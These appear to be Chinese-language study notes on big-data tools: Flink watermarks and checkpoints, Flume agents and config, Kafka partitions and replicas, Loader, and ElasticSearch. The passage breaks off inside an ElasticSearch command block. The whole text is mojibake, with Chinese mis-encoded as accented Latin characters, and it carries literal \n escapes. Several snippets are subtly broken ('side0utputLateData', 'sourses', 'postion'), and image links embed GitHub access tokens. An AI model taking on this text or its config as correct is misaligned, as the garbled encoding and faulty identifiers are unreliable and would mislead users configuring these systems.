äº‹ä»¶å‘ç”Ÿçš„æ—¶é—´ \n- æ—¶é—´ç±»å‹: æ—¶é—´è¾¾åˆ°å¤„ç†ç³»ç»Ÿçš„æ—¶é—´\n- å¤„ç†æ—¶é—´(é»˜è®¤): æ—¶é—´è¢«å¤„ç†çš„æ—¶é—´\n- æ—¶é—´ä¹±åºé—®é¢˜: äº‹ä»¶è¢«å¤„ç†çš„é¡ºåºä¸æ˜¯æ—¶é—´äº§ç”Ÿé¡ºåº\n- æ—¶é—´ä¹±åºåŸå› : æ•°æ®å—åˆ°æ•°æ®ä¼ è¾“å½±å“\n\n\n## Watermark(æ°´ä½çº¿/æ°´å°): è§£å†³æ•°æ®ä¹±åºé—®é¢˜\n- è®¾å®šæ°´ä½çº¿æ—¶é—´,å½“æ°´ä½çº¿è®¾å®šçš„æ—¶é—´æ—¶é—´ä¹Ÿè¾¾åˆ°ç³»ç»Ÿæ—¶,å°±ä¼šè§¦å‘çª—å£æ‰§è¡Œ\n- å¯è®¾ç½®æ°´ä½çº¿å»¶è¿Ÿ,å¯å…è®¸çª—å£å»¶è¿Ÿè§¦å‘\\\n\n\n\n\n## å¯¹äºå»¶è¿Ÿæ•°æ®çš„å¤„ç†æ–¹å¼\n- ä¸¢å¼ƒ(é»˜è®¤): å½“çª—å£å·²ç»è¢«è§¦å‘è¿‡,è¯¥çª—å£çš„æ•°æ®è¾¾åˆ°ä¹Ÿä¼šè¢«ä¸¢å¼ƒ,ä¸ä¼šè¢«æ‰§è¡Œ\n- å¯å…è®¸å»¶è¿Ÿ: è®¾å®šå¯å…è®¸å»¶è¿Ÿæ—¶é—´,çª—å£å·²ç»è¢«æ‰§è¡Œ,ä½†æ˜¯è¾“åœ¨å¯å…è®¸å»¶è¿Ÿæ—¶é—´è¾¾åˆ°,é‡æ–°é‡å‘çª—å£çš„æ‰§è¡Œ\\\n  `allowedLateness`(å¯å»¶è¿Ÿæ—¶é—´)\n- æ”¶é›†ååšç»Ÿä¸€å¤„ç†: æŠŠæ‰€æœ‰çš„å»¶è¿Ÿæ•°æ®æ”¶é›†èµ·æ¥,åœ¨ç¨‹åºæœ€ååšç»Ÿä¸€å¤„ç†\\\n`OutputTag<T> lateOutputTag = new OutputTag //ç”¨äºå­˜æ”¾å»¶è¿Ÿæ•°æ®çš„æ•°æ®é›†`\\\n`.side0utputLateData(late0utputTag)`\n\n## Flinkå®¹é”™æ€§ (CheckPointå®ç°)\n1. `CheckPoint:æ£€æŸ¥ç‚¹ï¼Œè‡ªåŠ¨è§¦å‘,å½“ä»»åŠ¡ç»“æŸåä¼šè‡ªåŠ¨åˆ é™¤`\n    - ä¿å­˜å½“å‰ä»»åŠ¡çŠ¶æ€ï¼Œå‘¨æœŸæ€§è§¦å‘,é»˜è®¤æƒ…å†µä¸‹ä¸å¯åŠ¨æ£€æŸ¥ç‚¹\n    - åœ¨å¯åŠ¨æ£€æŸ¥ç‚¹æ—¶å°±å¯ä»¥è®¾å®šå‘¨æœŸæ—¶é—´ï¼Œå•ä½ms: .enableCheckPointing(10000)\n    - ä¿®æ”¹æ¶ˆæ¯ä¼ è¾“è¯­ä¹‰(é»˜è®¤æƒ…å†µä»…æœ‰ä¸€æ¬¡): .setCheckPointMode(CheckPointMode.AT_LEAST_ONCE)\n    - å¿«ç…§è¶…æ—¶æ—¶é—´:é˜²æ­¢ä¸€ä¸ªé—®é¢˜å¿«ç…§å½±å“å¤§é‡å¿«ç…§åˆ›å»ºå †ç§¯: .setCheckpointingTimeout(60000)\n    - å¯ä»¥è®¾å®šæ£€æŸ¥ç‚¹ä¹‹é—´çš„æœ€å°é—´éš”æ—¶é—´\n    - å¯ä»¥è®¾å®šæœ€å¤§å¹¶è¡Œæ‰§è¡Œæ•°é‡\n    - è®¾å®šå¤–éƒ¨æ£€æŸ¥ç‚¹:å¯ä»¥æŠŠæ£€æŸ¥ç‚¹ä¿¡æ¯å­˜å‚¨äºåœ¨å¤–éƒ¨ç³»ç»Ÿä¸­ï¼Œä¸ä¼šå› ä¸ºFlinkç³»ç»Ÿé—®é¢˜å—åˆ°å½±å“\n2. SavePoint:ä¿å­˜ç‚¹ï¼Œåº•å±‚CheckPoint, æ‰‹åŠ¨è§¦å‘,ä»»åŠ¡ç»“æŸåä¹Ÿä¾æ—§ä¿ç•™\n\n## çŠ¶æ€ä¿å­˜\nå†…å­˜:é»˜è®¤ï¼Œstateå’Œcheckpointéƒ½å­˜å‚¨åœ¨å†…å­˜ï¼Œåªæ˜¯ç”¨æœ¬åœ°æµ‹è¯•\næ–‡ä»¶ç³»ç»Ÿ: stateåœ¨å†…å­˜ï¼Œ checkpointåœ¨æ–‡ä»¶ç³»ç»Ÿä¸­\næ•°æ®åº“: stateå­˜å‚¨åœ¨å†…ç½®æ•°æ®åº“ä¸­ï¼Œcheckpointåœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œé’ˆå¯¹å¤§é‡æ•°æ®ä»»åŠ¡å¤„ç†çš„åœºæ™¯\n\n# Flume\n    Flumeå±äºä¸€ä¸ªé«˜æ€§èƒ½ã€åˆ†å¸ƒå¼çš„æµ·é‡æ—¥å¿—é‡‡é›†å·¥å…·å¯ä»¥é€‚ç”¨äºæµæ•°æ®é‡‡é›†ã€ä¹Ÿå¯ä»¥ç”¨äºé™æ€æ•°æ®é‡‡é›†\n\n## FlumeåŸºç¡€æ¶æ„\n    (ä¸»ç”¨åº”ç”¨äºå•èŠ‚ç‚¹æ•°æ®é‡‡é›†)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151420684.png?token=ARYCSAQ53KMGFJWE4NRDOKDCQCN6Y)\n\n- Flumeä¸­æœ‰ä¸¤ä¸ªç»„ä»¶å¯¹å¤–äº¤äº’: sourceã€ sink\n- source:é‡‡é›†æ•°æ®,æ¥æ”¶æ•°æ®è¾“å…¥\n- channel:ç®¡é“ã€ ä¸´æ—¶å­˜å‚¨\n- sink:æ•°æ®è¾“å‡º\n\n## Flumeå¤šagentæ¶æ„\n    (ä¸»è¦ç”¨äºé›†ç¾¤å¤–é‡‡é›†ä¼ é€’åˆ°é›†ç¾¤å†…é‡‡é›†)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151420961.png?token=ARYCSAULGDFE5WKWJBQV4WTCQCN7I)\n\n- æŠŠç¬¬ä¸€çº§çš„Flumeæ•°æ®è¾“å‡ºåˆ°ç¬¬äºŒçº§Flumeä¸­\n- è®¾å®šç¬¬ä¸€-çº§Flumeçš„sinkç±»å‹ä¸ºavroåè®®æˆ–è€…thriftåè®®å¯ä»¥å°†æ•°æ®å­˜å‚¨åˆ°ä¸‹ä¸€çº§Flumeçš„Source\n\n## Flumeå¤šAgentåˆå¹¶ \n    (å°†å¤šæ•°æ®æºé‡‡é›†åˆ°çš„æ•°æ®æ±‡æ€»å¤„ç†)\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151420077.png?token=ARYCSAXS56IVNM2IIBLZWVDCQCOAC)\n\n## Flumeæ•°æ®ä¼ è¾“åŸºæœ¬å•ä½\n- event: åŸºæœ¬å•ä½,header+ byte[]\n- å½“sourceé‡‡é›†æ•°æ®æ—¶ï¼Œåœ¨sourceå†…éƒ¨å°†æ•°æ®å°è£…æˆevent\n\n## Flume AgentåŸç†\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151421543.png?token=ARYCSATG3JJOAWTBCBKGDG3CQCOAY)\n\n1. åœ¨sourceå†…éƒ¨å¯ä»¥å°†æ•°æ®å°è£…æˆevent\n2. sourceå°†eventä¼ è¾“ç»™channelå¤„ç†å™¨(æ‹¦æˆªå™¨)å¯ä»¥åšæ•°æ®ç®€å•å¤„ç†\n3. æ¸…æ´—å®Œåçš„æ•°æ®é€šè¿‡channe|é€‰æ‹©å™¨å°†eventè¾“å…¥åˆ°æŒ‡å®šçš„channel\n4. SinkRunneråœ¨ç¨‹åºè¿è¡Œæ—¶å°±å¯åŠ¨\n5. ä½¿ç”¨sinkå¤„ç†å™¨å®ä¾‹åŒ–ä¸€ä¸ªæŒ‡å®šç±»å‹çš„sinkä»æŒ‡å®šçš„channelä¸­æŠ½å–æ•°æ®\n6. å°†æŠ½å–åˆ°çš„æ•°æ®æŒ‰ç…§è®¾å®šçš„ç±»å‹å’Œç›®çš„è·¯å¾„å°†æ•°æ®è¾“å‡º\n\n## Flume Source \n    (æ•°æ®æ”¶é›†ã€æ¥æ”¶æ•°æ®è¾“å…¥)\n- é©±åŠ¨å‹:è¢«åŠ¨æ¥æ”¶æ•°æ®è¾“å…¥\n- è½®è¯¢å‹:å‘¨æœŸæ€§çš„ä¸»åŠ¨æ‰«ææ˜¯å¦æœ‰æ–°æ•°æ®äº§ç”Ÿ\n\n## Flume Channel \n    (æ•°æ®å­˜å‚¨)\n- MemoryChannel (å†…å­˜) : eventæ•°æ®å­˜æ”¾åœ¨å½“å‰èŠ‚ç‚¹çš„å†…å­˜ä¸­\\\n    è¯»å†™é€Ÿåº¦å¿«ï¼Œæ•°æ®æœªæŒä¹…åŒ–ï¼Œå ç”¨å†…å­˜ç©ºé—´\\\n    capacity:æœ€å¤§å†…å­˜å®¹é‡(é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨åˆ°èŠ‚ç‚¹å†…å­˜å­˜æ»¡ä¸ºæ­¢)\n  \n- FileChannel (æ–‡ä»¶) :ä½¿ç”¨WAL,ç®¡ç†ä¸Šæ¯”è¾ƒå¤æ‚\\\næ•°æ®å¯æŒä¹…åŒ–ï¼Œæ•°æ®è¯»å†™é€Ÿåº¦æ…¢äºå†…å­˜å½¢å¼\n  \n- JDBCChannel (å†…ç½®æ•°æ®åº“) : derbyæ•°æ®åº“ï¼Œå¯ä»¥æ›¿ä»£Fileå­˜å‚¨çš„å½¢å¼\\\næ•°æ®å¯æŒä¹…åŒ–ï¼Œæ•°æ®è¯»å†™é€Ÿåº¦æ…¢äºå†…å­˜å½¢å¼\n  \n## Flume Sink \n    (æ•°æ®è¾“å‡º)\n\n## Flumeçš„Sourceã€Channelã€ Sinkä¹‹é—´çš„å…³ç³»\n- `ä¸€ä¸ªSourceè‡³å°‘è¿æ¥ä¸€ä¸ªChannel`\n- `ä¸€ä¸ªSinkåªä½œç”¨äºä¸€ä¸ªChannel`\n\n## Flumeçº§è”èŠ‚ç‚¹\n    çº§è”èŠ‚ç‚¹é—´ä¼ è¾“çš„æ•°æ®å¯ä»¥è¿›è¡ŒåŠ å¯†ã€å‹ç¼©\n- åŠ å¯†:æé«˜æ•°æ®ä¼ è¾“å®‰å…¨æ€§\n- å‹ç¼©:æé«˜æ•´ä½“ä¼ è¾“é€Ÿåº¦(å‡å°‘ä¼ è¾“æ—¶é—´)\n- `Flumeå†…éƒ¨æ•°æ®ä¼ è¾“(source --> channel --> sink) ä¸éœ€è¦åŠ å¯†`\n\n## Flumeè¿è¡Œå®ä¾‹\n    å†…å®¹éœ€è¦é…ç½®åˆ°é…ç½®æ–‡ä»¶ä¸­(è‡ªå®šä¹‰.properties)\n```bash\na.sources= r1\na.channels=c1\na.sinks=k1\na.sourses.r1.type=taildir\na.sourses.r1.postion= è®°å½•posè®°å½•çš„æ–‡ä»¶\na.sourses.r1.filegroups=f1 f2\na.sourses.r1.filegroups.f1 = è¦ç›‘æ§çš„æ–‡ä»¶\na.sourses.r1.filegroups.f2= è¦ç›‘æ§çš„æ–‡ä»¶\na.channels.c1.type=memory\na.sinks.k1.type=logger\na.sources.r1.channels=c1\na.sinks.k1.channel=c1\n```\n\n## Flumeè¿è¡Œå‘½ä»¤\n```bash\nflume-ng agent --name a --conf flumecÃ¯ 71411Z --conf-file é…ç½®æ–‡ä»¶ - Dflume.root.logger=info, console\nflume-ng agent -n a -C flumeé…ç½®æ–‡ä»¶è·¯å¾„ -f é…ç½®æ–‡ä»¶ -Dflume.root.logger=info, console\n```\n\n# Kafka\n    åˆ†å¸ƒå¼æ—¥å¿—ç³»ç»Ÿ(å‘å¸ƒè®¢é˜…æ¶ˆæ¯ç³»ç»Ÿ)ï¼Œå¯åˆ†åŒºã€å¤šå‰¯æœ¬ã€å¤šè®¢é˜…\n\n## æ¶ˆæ¯ä¼ è¾“å½¢å¼\n- ç‚¹å¯¹ç‚¹:æ•°æ®åœ¨è¢«è·å–åˆ°ä¹‹åå°±ä¼šè¢«ä»æ¶ˆæ¯ç³»ç»Ÿä¸­åˆ é™¤(åªæœ‰-ä¸€ä¸ªç”¨æˆ·å¯ä»¥è·å–åˆ°è¿™ä¸ªæ¶ˆæ¯)\n- å‘å¸ƒè®¢é˜…:æ¶ˆæ¯å‘å¸ƒä¹‹åï¼Œå°±ç®—è¢«ç”¨æˆ·è·å–ä¹‹åä¹Ÿä¸ä¼šåˆ é™¤ï¼Œä¾æ—§ä¿ç•™åœ¨ç³»ç»Ÿä¸­æä¾›ç»™å…¶ä»–ç”¨æˆ·è·å–\n\n## Kafkaçš„ç‰¹ç‚¹\n- å¯æ”¯æŒTBçº§åˆ«çš„æ•°æ®ä¹Ÿèƒ½åœ¨å¸¸é‡æ—¶é—´å†…çš„è®¿é—®æ€§èƒ½\n- é«˜ååç‡:å•èŠ‚ç‚¹æ¯ç§’å¯ä»¥ä¼ è¾“100Kæ¡æ•°æ®\n- å¯åˆ†åŒº:æ•°æ®ä»¥åˆ†åŒºå½¢å¼å­˜å‚¨\n- å¤šå‰¯æœ¬:æé«˜æ•°æ®å®¹é”™æ€§\n- åŒæ—¶æ”¯æŒæµå¤„ç†å’Œæ‰¹å¤„ç†\n- å¯æ‰©å±•æ€§:æœ¬èº«å±äºé›†ç¾¤ç”±å¤šèŠ‚ç‚¹ç»„æˆï¼Œæ‰©å±•èŠ‚ç‚¹\n\n## Kafkaæ‹“æ‰‘ç»“æ„\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151421126.png?token=ARYCSAWNQND46BLECQTNASDCQCOBU)\n\n- Kafka:ç”±brokeré›†ç¾¤ç»„æˆ\n- Producer:æ•°æ®å‘å¸ƒè€…ï¼Œå‘å¸ƒæ¶ˆæ¯ï¼Œå°†æ•°æ®å‘å¸ƒåˆ°Kafkaä¸­å­˜å‚¨\n- Consumer:æ•°æ®æ¶ˆè´¹è€…ï¼Œè®¢é˜…æ¶ˆæ¯ï¼Œä»Kafkaä¸­è·å–æ•°æ®\n- ZooKeeper: Kafkaå¼ºä¾èµ–ï¼Œç›‘æµ‹é›†ç¾¤çŠ¶æ€\n\n## Kafkaé›†ç¾¤ç³»ç»Ÿæ¶æ„\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151422239.png?token=ARYCSATAJWDNKTIBO7OTGSLCQCOFA)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151422226.png?token=ARYCSASRM7AGQUEACQZWSCDCQCOFS)\n\n## æ¶ˆè´¹ç»„:consumer group\n    æ¯ä¸ªæ¶ˆè´¹è€…ä¸€å®šæ˜¯å±äºæŸä¸€ä¸ªæ¶ˆè´¹ç»„\n- æ¶ˆè´¹æ•°æ®è§„åˆ™:æ¶ˆè´¹ç»„å†…çš„æ•°æ®æ˜¯ç«äº‰çš„,æ¶ˆè´¹ç»„é—´çš„æ•°æ®æ˜¯å…±äº«çš„ \\\n  ä¸€æ¡æ¶ˆæ¯å¯ä»¥è¢«å¤šä¸ªæ¶ˆè´¹ç»„è·å–,ä½†æ˜¯æ¯ä¸ªæ¶ˆè´¹ç»„åªèƒ½æœ‰ä¸€ä¸ªæ¶ˆè´¹è€…æ¶ˆè´¹ä¿¡æ¯\n- Kafka Topic:æ¶ˆæ¯ç±»åˆ«å\\\nç”¨äºåŒºåˆ†è®°å½•æ•°æ®ã€å‘å¸ƒè€…å‘å¸ƒæ•°æ®æ—¶éœ€è¦æŒ‡å®štopic,æ¶ˆè´¹è€…è®¢é˜…æ•°æ®æ—¶æŒ‡å®štopic\n- Kafka Partition:åˆ†åŒºï¼Œæ•°æ®å†™å…¥:é¡ºåºè¿½åŠ çš„æ–¹å¼\\\næ•°æ®ä»¥åˆ†åŒºçš„å½¢å¼å­˜å‚¨ï¼Œåœ¨åˆ›å»ºtopicæ—¶å¯ä»¥æŒ‡å®šå½“å‰topicä¸­æœ‰å‡ ä¸ªåˆ†åŒº\n- Kafka Segment:åˆ†æ®µ\\\næ¯ä¸ªæ¶ˆæ¯å°±æ˜¯ä¸€ä¸ªåˆ†æ®µ, åˆ†æ®µç”±ä¸¤ä¸ªæ–‡ä»¶ç»„æˆ.indexå’Œ.log\n- Offset:åç§»é‡å€¼\\\næ¯ä¸€ä¸ªæ¶ˆæ¯éƒ½æœ‰çš„å”¯ä¸€æ ‡è¯†ä½ç½®\n- æ¯ä¸ªæ¶ˆè´¹ç»„éƒ½ä¼šç»´æŠ¤ä¸€ä»½offsetæ–‡ä»¶(å½“å‰ç»„ä¸­çš„æˆå‘˜è¯»å–çš„æ•°æ®ä½ç½®)\n- è¯»å–æ•°æ®æ—¶æ•°æ®å®šä½: broker --> topic --> offset\n\n## Kafkaçš„å…¶ä»–é‡è¦æ¦‚å¿µ\n- replica:å‰¯æœ¬ï¼Œåœ¨åˆ›å»ºpartitionçš„æ—¶å€™æŒ‡å®šè¯¥åˆ†åŒºæœ‰å‡ ä¸ªå‰¯æœ¬\\\n--partitons 1 --replaction-factor 2\\\næ•°æ®æ–‡ä»¶ä¸º2ä»½ï¼Œpartitonæœ¬èº«ä¹Ÿå±äºå‰¯æœ¬çš„ä¸€éƒ¨åˆ†\n- leader:ä»å‰¯æœ¬ä¸­é€‰å–ä¸€ä¸ªleaderå¯¹å¤–æä¾›æœåŠ¡ï¼Œå‘å¸ƒè€…å’Œæ¶ˆæ¯è€…åªè·Ÿleaderäº¤äº’\n- follower:é™¤leaderä»¥å¤–çš„å…¶ä»–å‰¯æœ¬éƒ½æ˜¯follower, followeråŒæ­¥leaderä¿¡æ¯\n- controller: kafkaä¸­çš„ä¸€ -ä¸ªæœåŠ¡å™¨: leaderé€‰ä¸¾ã€ leaderåˆ‡æ¢\n- ISRåˆ—è¡¨:åˆ—è¡¨ä¸­çš„follower,èƒ½æ­£å¸¸åŒæ­¥leaderä¿¡æ¯\\\nåªæœ‰åœ¨åˆ—è¡¨ä¸­çš„followeræœ‰èµ„æ ¼æˆä¸ºä¸‹ä¸€-ä»»leader\\\nåˆšå¼€å§‹æ‰€æœ‰çš„followeréƒ½åœ¨ISRåˆ—è¡¨ä¸­ï¼Œå½“followeræ•…éšœä¸èƒ½åŠ æ—¶åŒæ­¥leaderæ—¶ä¼šè¢«ç§»é™¤åˆ—è¡¨\n  \n## Kafkaåˆ†åŒºå‰¯æœ¬\n    (èŠ‚ç‚¹å’ŒèŠ‚ç‚¹ä¹‹é—´çš„åˆ†åŒºäº’ä¸ºä¸»å¤‡)\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151422335.png?token=ARYCSAWMSBMNJRP2FG4WMY3CQCOGE)\n\nåˆ†åŒºå‰¯æœ¬åŒæ­¥\n\n    (followerä»leaderåŒæ­¥æ•°æ® )\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151422218.png?token=ARYCSAXBVFDRGL4Q2FLNJC3CQCOG2)\n\n- å¦‚æœæ‰€æœ‰åˆ†åŒºéƒ½å‡ºç°æ•…éšœ\\\nå¯é æ€§é«˜ã€æ¢å¤é€Ÿåº¦æ…¢:ç­‰å¾…ISRä¸­çš„åˆ†åŒºæ¢å¤ï¼Œç¬¬ä¸€ä¸ªæ¢å¤å°±æ˜¯leader\\\nå¯é æ€§ä½ã€æ¢å¤é€Ÿåº¦å¿«:ç­‰å¾…åˆ†åŒºæ¢å¤ï¼Œç¬¬ä¸€ä¸ªæ¢å¤çš„ä¸ç®¡æ˜¯ä¸æ˜¯ISRåˆ—è¡¨ä¸­çš„åˆ†åŒºä¹Ÿæˆä¸ºleader\n- å¯é æ€§ä¼ è¾“:å¹‚ç­‰æ€§(æ“ä½œä¸€æ¬¡å’Œå¤šæ¬¡çš„ç»“æœæ˜¯ä¸€æ ·)\\\nç»™æ¯æ¡æ¶ˆæ¯ä¸€ä¸ªå”¯-æ ‡è¯†id, æ¶ˆæ¯ä¼ é€’åä½¿ç”¨ä¸€ä¸ªåˆ—è¡¨è®°å½•å·²ä¼ è¾“æˆåŠŸçš„æ¶ˆæ¯id\\\næ¯æ¡æ¶ˆæ¯ä¼ è¾“åˆ°è¾¾æ—¶éƒ½ä¼šè¢«ä½¿ç”¨idåœ¨åˆ—è¡¨ä¸­æŸ¥è¯¢ï¼ŒæŸ¥çœ‹idæ˜¯å¦å­˜åœ¨\\\nå¦‚æœå­˜åœ¨:è¯´æ˜æ¶ˆæ¯ä¹‹å‰å·²ç»è¢«ä¼ è¾“è¿‡\\\nå¦‚æœä¸å­˜åœ¨:æ­£å¸¸å¤„ç†ï¼Œå¹¶ä¸”å¤„ç†å®Œåå°†idå†™å…¥åˆ—è¡¨\n- acksæœºåˆ¶(æ£€æµ‹æ•°æ®æ˜¯å¦å‘é€æˆåŠŸ)\\\nacks=0:ä¸ç®¡æ•°æ®æ˜¯å¦å‘é€æˆåŠŸ\\\nacks=1:å½“æ•°æ®å†™å…¥leaderæ—¶å°±è®¤ä¸ºæˆåŠŸ\\\nacks=all:å½“æ•°æ®å†™å…¥leaderå¹¶ä¸”followeréƒ½æ¥æ”¶åˆ°æ‰åé¦ˆæˆåŠŸ\n- KafkaæŒä¹…åŒ–å­˜å‚¨æ•°æ®(ä¸ç®¡æ•°æ®æœ‰æ²¡æœ‰è¢«æ¶ˆè´¹è¿‡)\n- æ—§æ•°æ®çš„å¤„ç†æ–¹å¼:åˆ é™¤/å‹ç¼©\\\nåˆ é™¤:é…ç½®æ•°æ®è¿‡æœŸæ—¶é—´\\\nå‹ç¼©:æ ¹æ®é”®å€¼å¯¹çš„keyå€¼åªä¿ç•™æœ€æ–°çš„valueå€¼ï¼Œä»¥å‰çš„å€¼å°±åˆ é™¤\n- Kafkaé«˜ååçš„åŸå› \\\né¡ºåºè¯»å†™:æ•°æ®ä»¥è¿½åŠ å½¢å¼å†™å…¥åˆ†åŒºï¼Œé€Ÿåº¦è¿œå¿«äºéšæœºè¯»å†™\\\né›¶æ‹·è´:æ•°æ®å†™å…¥ä¸éœ€è¦ç»è¿‡æ•°æ®ç¼“å†²åŒºç›´æ¥åˆ°è¾¾ç£ç›˜\\\nåˆ†åŒº:æ•°æ®å¯ä»¥åˆ†åˆ«å­˜åœ¨å¤šä¸ªåˆ†åŒºä¸­ï¼Œè¯»å–çš„æ—¶å€™å¯ä»¥å¹¶è¡Œçš„ä»åˆ†åŒºä¸­è¯»å–åˆ°æ•°æ®\\\nå‹ç¼©:å¯ä»¥å¯¹æ•°æ®è¿›è¡Œå‹ç¼©\n  \n`åˆ†åŒºå‰¯æœ¬:åªæœ‰leaderå¯¹å¤–æä¾›æœåŠ¡çš„, followeråªåšåŒæ­¥æ“ä½œ`\n\n# Loader\n    åŸºäºå¼€æºçš„Sqoopç»„ä»¶å¼€å‘å¾—åˆ°çš„\n\n## Loader\n- Loaderæ•°æ®å¯¼å…¥å¯¼å‡º(ä½œç”¨åœ¨å…³ç³»å‹æ•°æ®åº“å’Œéå…³ç³»å‹æ•°æ®åº“ä¹‹é—´)\\\nå…³ç³»å‹æ•°æ®åº“:ç»“æ„åŒ–\\\néå…³ç³»å‹æ•°æ®åº“:éç»“æ„åŒ–\n- æ•°æ®å¯¼å…¥:æ•°æ®ä»RDBå¯¼å…¥åˆ°NoSQL\n- æ•°æ®å¯¼å‡º:æ•°æ®ä»NoSQLå¯¼å‡ºåˆ°RDB\n- Loaderç›¸æ¯”è¾ƒSqoopç»„ä»¶çš„å¢å¼ºç‰¹æ€§\\\nå›¾å½¢åŒ–:æä¾›WebUIç•Œé¢å¯ä»¥é€šè¿‡ç•Œé¢é…ç½®ä»»åŠ¡,è¿æ¥å™¨çš„é…ç½®`MRS (Hue)`\\\né«˜æ€§èƒ½:åº•å±‚ä½¿ç”¨MapReduceå¹¶è¡Œå¤„ç†\\\né«˜å¯é :ä¸»å¤‡åŒæœºçš„æ­å»º\\\n    ä½œä¸šå¤±è´¥åå…è®¸é‡è¯•\n    ä½œä¸šå¤±è´¥åä¸ä¼šæœ‰æ®‹ç•™çš„æ•°æ®\nå®‰å…¨æ€§:ä½¿ç”¨kerberosè¿›è¡Œå®‰å…¨è®¤è¯\n  \n## Loaderæ¨¡å‹æ¶æ„\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151422011.png?token=ARYCSAS7ZWGY6RPEGOYEUMTCQCOHI)\n\n1. Loader Client: Tool: å‘½ä»¤è¡Œæ¨¡å¼è¿æ¥LoaderæœåŠ¡\n    - Web UI: MRSå›¾å½¢åŒ–çš„æ–¹å¼è¿æ¥åˆ°Loader\n    \n2. Loader Server:\n    - Restful API (http+json) å¯¹å¤–æä¾›çš„è¿æ¥æ¥å£\n    - JobSheduler: Transform è½¬æ¢æ¨¡å—-->æ•°æ®å¤„ç†.\\\n    Executionæ‰§è¡Œæ¨¡å—-->æ‰§è¡Œè®¡åˆ’\\\n    Submissionæäº¤æ¨¡å—-->æäº¤åˆ°MR\\\n    JobManager:ç®¡ç†ä»»åŠ¡æ‰§è¡ŒçŠ¶æ€\n    - Metadata Repository:å…ƒæ•°æ®ä»“åº“ï¼Œå­˜å‚¨ç®¡ç†å…ƒæ•°æ®\n    - HA Manager:ä¸»å¤‡ç®¡ç†\n    \n\n## Loaderä»»åŠ¡æ‰§è¡Œ\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151422876.png?token=ARYCSASCAA6THGM7VECBPZDCQCOH2)\n\n1. Clientæäº¤ä»»åŠ¡\n2. Loaderä»»åŠ¡è®¡åˆ’\n3. å°†ä»»åŠ¡æäº¤ç»™Yarn\n4. Yarnè°ƒé…èµ„æºå°†ä»»åŠ¡åˆ†é…ä¸ºMapæˆ–Reduceä»»åŠ¡æ‰§è¡Œ\n5. å°†æ•°æ®å­˜å…¥è®¾å®šçš„å­˜å‚¨ä»‹è´¨ä¸­\n\n## Loaderä»»åŠ¡é…ç½®\n- è¾“å…¥:æ•°æ®æ¥æºçš„é…ç½®\n- è½¬æ¢:å­—æ®µæ˜ å°„ã€è·å–æ•°æ®ã€è¿‡æ»¤æ•°æ®ã€å¹¶å‘æ‰§è¡Œæ•°é‡\n- è¾“å‡º:æ•°æ®æœ€ç»ˆè¾“å‡ºç›®çš„åœ°çš„é…ç½®\n\n# ElasticSearch\n    åˆ†å¸ƒå¼æ£€ç´¢æœåŠ¡,é€‚ç”¨å®æ—¶åœºæ™¯\n    Hive:å¯ä»¥åšæŸ¥è¯¢åˆ†æï¼Œåº•å±‚MRå¤„ç†ï¼Œä¸é€‚ç”¨å®æ—¶\n\n## ElasticSearchç‰¹ç‚¹\n- åŸºäºLucenaæ‰©å±•\n- å¯ä»¥æ°´å¹³æ‰©å±•\n- åŸå‹ç¯å¢ƒå’Œç”Ÿäº§ç¯å¢ƒå¯ä»¥æ— ç¼åˆ‡æ¢\n- `ä½œä¸ºéå…³ç³»å‹æ•°æ®åº“NoSQLæ•°æ®åº“ä½¿ç”¨`\n- æ”¯æŒç»“æ„åŒ–æ•°æ®å’Œéç»“æ„åŒ–æ•°æ®\n\n\n## ç´¢å¼•\n1. æ­£æ’ç´¢å¼•:åœ¨æ–‡ä»¶ä¸­æŸ¥æ‰¾å…³é”®å­— \\\n    æ‰«ææ¯ä¸ªæ–‡ä»¶å†…å®¹æ‰¾åˆ°è·Ÿå…³é”®å­—ç›¸å…³çš„æ–‡ä»¶ï¼Œè¿”å›æ–‡ä»¶ \n   \n\n2.  å€’æ’ç´¢å¼•:æ ¹æ®å…³é”®å­—æŸ¥æ‰¾æ–‡ä»¶(æå‰ç»™æ–‡ä»¶è®¾å®šå…³é”®å­—)\\\n    æ ¹æ®å…³é”®å­—æŸ¥å“ªäº›æ–‡ä»¶æ ‡è®°äº†è¿™ä¸ªå…³é”®å­—\\\n    å¿«é€ŸæŸ¥æ‰¾ç›¸å…³æ–‡ä»¶ï¼Œå¹¶ä¸”æ–‡ä»¶ç›¸å…³åº¦æ›´é«˜ \n    \n\n## ElasticSearchç³»ç»Ÿæ¶æ„\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151423023.png?token=ARYCSAUFEFGFKRZGMEMZQSTCQCOI6)\n\n- Client:è¿æ¥åˆ°ZooKeeperè·å–é›†ç¾¤ä¿¡æ¯ï¼Œè¿æ¥åˆ°é›†ç¾¤\n- EsMaster:ä¸»è¦ä»»åŠ¡åˆ†é…ï¼Œç®¡ç†EsNodeä¿¡æ¯ï¼Œ ä¸å‚ä¸åˆ†ç‰‡çº§åˆ«çš„æ•°æ®æ£€ç´¢\n- EsNode:å¤„ç†ç”¨æˆ·ç®¡ç†ç´¢å¼•|æ“ä½œï¼Œç®¡ç†è‡ªèº«åˆ†ç‰‡ä¿¡æ¯(æ•°æ®é»˜è®¤å­˜å‚¨åœ¨å†…å­˜ä¸­)\n- ZooKeeper: eså¼ºä¾èµ–ï¼Œç®¡ç†é›†ç¾¤çŠ¶æ€ï¼Œå¹¶ä¸”è®°å½•é›†ç¾¤ä¿¡æ¯\n\n## ElasticSearchä¸­çš„æ ¸å¿ƒæ¦‚å¿µ\n- ç´¢å¼•: index --> å‘½åç©ºé—´\n- æ–‡æ¡£: document --> æ•°æ®å­˜å‚¨ï¼ŒESä¸­çš„æ£€ç´¢åŸºæœ¬å•å…ƒ\n- æ˜ å°„: mapping --> çº¦æŸå­—æ®µç±»å‹\n\n## ElasticSearchå‘½ä»¤ä½¿ç”¨\n\n```bash\næ•°æ®æ·»åŠ /ä¿®æ”¹: put /ç´¢å¼•/_doc/id\n{\n  